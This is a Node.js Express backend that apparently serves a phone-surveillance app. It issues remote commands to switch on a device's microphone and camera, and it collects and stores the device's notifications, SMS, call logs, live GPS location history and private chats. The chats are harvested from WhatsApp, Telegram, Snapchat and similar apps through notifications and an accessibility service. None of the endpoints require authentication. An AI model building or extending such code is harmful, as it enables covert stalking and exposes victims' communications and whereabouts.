const express = require('express');
const cors = require('cors');
const http = require('http');
const path = require('path');
const fs = require('fs');
require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
require('dotenv').config();

const usageRoutes = require('./routes/usage');
const mediaRoutes = require('./routes/media');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3001;

const { setupSignaling } = require('./signaling');
const io = setupSignaling(server);

app.use(cors());
app.use(express.json({ limit: '10mb' }));

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: Date.now() });
});

app.use('/api', usageRoutes);
app.use('/api', mediaRoutes);

// ---- Commands (dashboard sets, phone polls) ----
const audioCommands = new Map();
const cameraCommands = new Map();

app.post('/api/audio-command/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { listen } = req.body;
  audioCommands.set(deviceId, { listen: !!listen });
  res.json({ ok: true, listen: !!listen });
});

app.get('/api/audio-command/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const cmd = audioCommands.get(deviceId) || { listen: false };
  res.json(cmd);
});

app.post('/api/camera-command/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { stream, facing } = req.body;
  const prev = cameraCommands.get(deviceId) || { stream: false, facing: 'back' };
  const next = {
    stream: stream === undefined ? prev.stream : !!stream,
    facing: facing === undefined ? prev.facing : (facing === 'front' ? 'front' : 'back'),
  };
  cameraCommands.set(deviceId, next);
  res.json({ ok: true, ...next });
});

app.get('/api/camera-command/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const cmd = cameraCommands.get(deviceId) || { stream: false, facing: 'back' };
  res.json(cmd);
});

// ---- WebRTC Signaling ----
const webrtcOffers = new Map();    // deviceId -> { sdp }

// ---- Persistent storage helpers for Notifications, Calls & SMS ----
const DATA_DIR = path.join(__dirname, '..', 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

function loadMapFromFile(filename) {
  try {
    const p = path.join(DATA_DIR, filename);
    if (fs.existsSync(p)) {
      const obj = JSON.parse(fs.readFileSync(p, 'utf8'));
      return new Map(Object.entries(obj));
    }
  } catch (e) {
    console.error(`Failed to load ${filename}:`, e.message);
  }
  return new Map();
}

function saveMapToFile(m, filename) {
  try {
    const p = path.join(DATA_DIR, filename);
    const obj = Object.fromEntries(m);
    fs.writeFileSync(p, JSON.stringify(obj, null, 2), 'utf8');
  } catch (e) {
    console.error(`Failed to save ${filename}:`, e.message);
  }
}

// In-memory + disk backed maps
const notifications = loadMapFromFile('notifications.json');
const calls = loadMapFromFile('calls.json');
const sms = loadMapFromFile('sms.json');
const locations = loadMapFromFile('location.json');
const locationHistory = loadMapFromFile('location_history.json');
const chats = loadMapFromFile('chats.json');

const CHAT_PACKAGE_NAMES = {
  'com.whatsapp': 'WhatsApp',
  'com.whatsapp.w4b': 'WhatsApp Business',
  'org.telegram.messenger': 'Telegram',
  'org.telegram.messenger.web': 'Telegram',
  'com.facebook.orca': 'Messenger',
  'com.instagram.android': 'Instagram',
  'com.facebook.katana': 'Facebook',
  'com.viber.voip': 'Viber',
  'kik.android': 'Kik',
  'com.snapchat.android': 'Snapchat',
  'com.discord': 'Discord',
  'jp.naver.line.android': 'LINE',
  'com.imo.android.imoim': 'imo',
  'com.zhiliaoapp.musically': 'TikTok',
  'com.zhiliaoapp.musically.go': 'TikTok Lite',
  'com.tencent.mm': 'WeChat'
};

function syncNotificationToChats(deviceId, n) {
  if (!n || !n.packageName) return;
  const appName = CHAT_PACKAGE_NAMES[n.packageName];
  if (!appName) return;
  if (!n.text && !n.title) return;
  if (!chats.has(deviceId)) chats.set(deviceId, []);
  const chatArr = chats.get(deviceId);
  const msgHash = `${n.packageName}|${n.title}|${String(n.text).substring(0, 100)}`;
  if (!chatArr.some(x => x._hash === msgHash)) {
    chatArr.push({
      _hash: msgHash,
      packageName: n.packageName,
      appName: appName,
      sender: n.title || 'Unknown',
      message: n.text || '',
      isVoip: false,
      timestamp: n.postTime || n.receivedAt || Date.now()
    });
    if (chatArr.length > 2000) chatArr.splice(0, chatArr.length - 2000);
    saveMapToFile(chats, 'chats.json');
    console.log(`[Chats Auto-Sync] [${appName}] ${n.title}: ${n.text}`);
  }
}

// Backfill any existing notifications into chats
for (const [devId, notifList] of notifications.entries()) {
  if (Array.isArray(notifList)) {
    for (const notif of notifList) {
      syncNotificationToChats(devId, notif);
    }
  }
}

app.post('/api/notifications/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const n = req.body;
  if (!n || !n.packageName) return res.status(400).json({ error: 'invalid' });
  if (!notifications.has(deviceId)) notifications.set(deviceId, []);
  const arr = notifications.get(deviceId);
  const key = `${n.packageName}|${n.postTime}|${n.text}`;
  if (arr.find(x => `${x.packageName}|${x.postTime}|${x.text}` === key)) {
    return res.json({ ok: true, dup: true });
  }
  arr.push(n);
  saveMapToFile(notifications, 'notifications.json');
  syncNotificationToChats(deviceId, n);
  res.json({ ok: true });
});

app.get('/api/notifications/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const arr = notifications.get(deviceId) || [];
  res.json({ notifications: arr.slice().reverse() }); // newest first
});

// ---- Call & SMS logs ----
app.post('/api/calls/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const c = req.body;
  if (!c || !c.number) return res.status(400).json({ error: 'invalid' });
  if (!calls.has(deviceId)) calls.set(deviceId, []);
  const arr = calls.get(deviceId);
  const key = `${c.number}|${c.date}|${c.type}`;
  if (arr.find(x => `${x.number}|${x.date}|${x.type}` === key)) return res.json({ ok: true, dup: true });
  arr.push(c);
  saveMapToFile(calls, 'calls.json');
  console.log(`[Calls] Received call for ${deviceId}: ${c.number} (${c.type})`);
  res.json({ ok: true });
});

app.get('/api/calls/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const arr = calls.get(deviceId) || [];
  res.json({ calls: arr.slice().reverse() }); // newest first
});

app.post('/api/sms/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const s = req.body;
  if (!s || !s.address) return res.status(400).json({ error: 'invalid' });
  if (!sms.has(deviceId)) sms.set(deviceId, []);
  const arr = sms.get(deviceId);
  const key = `${s.address}|${s.date}|${s.body}`;
  if (arr.find(x => `${x.address}|${x.date}|${x.body}` === key)) return res.json({ ok: true, dup: true });
  arr.push(s);
  saveMapToFile(sms, 'sms.json');
  console.log(`[SMS] Received SMS for ${deviceId}: from/to ${s.address} (${s.type})`);
  res.json({ ok: true });
});

app.get('/api/sms/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const arr = sms.get(deviceId) || [];
  res.json({ sms: arr.slice().reverse() }); // newest first
});

// ---- Deep Chat Monitoring (Accessibility Service captured chats) ----
app.post('/api/chats/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const c = req.body;
  if (!c || !c.message) return res.status(400).json({ error: 'missing message' });

  if (!chats.has(deviceId)) chats.set(deviceId, []);
  const arr = chats.get(deviceId);

  // Deduplicate: pkg|sender|messageHash
  const msgHash = `${c.packageName}|${c.sender}|${String(c.message).substring(0, 100)}`;
  const exists = arr.some(x => x._hash === msgHash);
  if (!exists) {
    const entry = {
      _hash: msgHash,
      packageName: c.packageName || '',
      appName: c.appName || c.packageName || '',
      sender: c.sender || 'Unknown',
      message: c.message || '',
      isVoip: c.isVoip || false,
      timestamp: c.timestamp || Date.now()
    };
    arr.push(entry);
    // Keep last 2000 messages per device
    if (arr.length > 2000) arr.splice(0, arr.length - 2000);
    saveMapToFile(chats, 'chats.json');
    console.log(`[Chats] [${entry.appName}] ${entry.sender}: ${String(entry.message).substring(0, 60)}`);
  }
  res.json({ ok: true });
});

app.get('/api/chats/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const arr = chats.get(deviceId) || [];
  // Return newest first, strip internal _hash field
  const clean = arr.slice().reverse().map(({ _hash, ...rest }) => rest);
  res.json({ chats: clean });
});

// ---- Real-time Location Tracking ----
app.post('/api/location/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const loc = req.body;
  if (!loc || typeof loc.latitude !== 'number' || typeof loc.longitude !== 'number') {
    return res.status(400).json({ error: 'invalid coordinates' });
  }

  const record = {
    latitude: loc.latitude,
    longitude: loc.longitude,
    accuracy: loc.accuracy || 0,
    speed: loc.speed || 0,
    altitude: loc.altitude || 0,
    bearing: loc.bearing || 0,
    provider: loc.provider || 'gps',
    timestamp: loc.timestamp || Date.now(),
    receivedAt: Date.now()
  };

  locations.set(deviceId, record);
  saveMapToFile(locations, 'location.json');

  if (!locationHistory.has(deviceId)) locationHistory.set(deviceId, []);
  const hist = locationHistory.get(deviceId);
  // Keep last 1000 history breadcrumbs
  hist.push(record);
  if (hist.length > 1000) hist.shift();
  saveMapToFile(locationHistory, 'location_history.json');

  // Emit real-time event via Socket.IO for instant zero-lag pin movement
  if (io) {
    io.to(deviceId).emit('location-update', record);
    io.emit('location-update', { deviceId, ...record });
  }

  // Also update Firestore deviceStatus if available
  try {
    const { db } = require('./config/firebase');
    if (db) {
      db.collection('deviceStatus').doc(deviceId).set({
        latitude: record.latitude,
        longitude: record.longitude,
        accuracy: record.accuracy,
        speed: record.speed,
        lastLocationTime: record.timestamp
      }, { merge: true }).catch(() => {});
    }
  } catch (_) {}

  console.log(`[Location] Device ${deviceId}: ${record.latitude}, ${record.longitude} (acc: ${record.accuracy}m, speed: ${record.speed}m/s)`);
  res.json({ ok: true });
});

app.get('/api/location/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const current = locations.get(deviceId) || null;
  const history = locationHistory.get(deviceId) || [];
  res.json({ location: current, history });
});
const webrtcAnswers = new Map();   // deviceId -> { sdp }
const webrtcIceQueues = new Map(); // deviceId -> [{ from, candidate, sdpMid, sdpMLineIndex }]

app.post('/api/webrtc/offer/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { sdp } = req.body;
  if (sdp) {
    webrtcOffers.set(deviceId, { sdp });
    // Only clear the stale ANSWER on a new offer. Do NOT clear the ICE candidate
    // queue here: renegotiation (which re-POSTs an offer when ICE fails) would
    // wipe in-flight candidates and the connection could never complete, causing
    // an endless offer/answer loop with no media. Clients dedupe by candidate key.
    webrtcAnswers.delete(deviceId);
  }
  res.json({ ok: true });
});

app.get('/api/webrtc/offer/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const data = webrtcOffers.get(deviceId);
  if (data) {
    webrtcOffers.delete(deviceId);
    res.json(data);
  } else {
    res.json({ sdp: null });
  }
});

const lastAnswers = new Map();
app.post('/api/webrtc/answer/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { sdp } = req.body;
  if (sdp) { webrtcAnswers.set(deviceId, { sdp }); lastAnswers.set(deviceId, { sdp, at: Date.now() }); }
  console.log('ANSWER_RCVD', deviceId, 'len=', sdp ? sdp.length : 'NULL', 'head=', sdp ? String(sdp).substring(0, 80) : 'NULL');
  res.json({ ok: true });
});

app.get('/api/debug/answer/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const d = lastAnswers.get(deviceId);
  res.json({ preview: d ? String(d.sdp).substring(0, 140) : 'NONE', at: d ? d.at : null });
});

app.get('/api/webrtc/answer/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const data = webrtcAnswers.get(deviceId);
  if (data) {
    webrtcAnswers.delete(deviceId);
    res.json(data);
  } else {
    res.json({ sdp: null });
  }
});

app.post('/api/webrtc/ice/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { from, candidate, sdpMid, sdpMLineIndex } = req.body;
  if (!webrtcIceQueues.has(deviceId)) webrtcIceQueues.set(deviceId, { items: [] });
  const q = webrtcIceQueues.get(deviceId);
  q.items.push({ from, candidate, sdpMid, sdpMLineIndex });
  // Cap to avoid unbounded growth across restarts
  if (q.items.length > 200) q.items = q.items.slice(-200);
  res.json({ ok: true });
});

app.get('/api/webrtc/ice/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { from } = req.query;
  const q = webrtcIceQueues.get(deviceId) || { items: [] };
  // Never delete: a consumer may fetch repeatedly (restarts, renegotiation).
  // Clients dedupe by candidate key.
  const filtered = q.items.filter(c => c.from === from);
  res.json({ candidates: filtered });
});

const debugLogs = [];
app.post('/api/debug/log', (req, res) => {
  const { tag, msg } = req.body || {};
  debugLogs.push({ at: Date.now(), tag, msg });
  if (debugLogs.length > 30) debugLogs.shift();
  res.json({ ok: true });
});
app.get('/api/debug/log', (req, res) => {
  res.json({ logs: debugLogs });
});

server.listen(PORT, () => {
  console.log(`Backend running on http://localhost:${PORT}`);
});
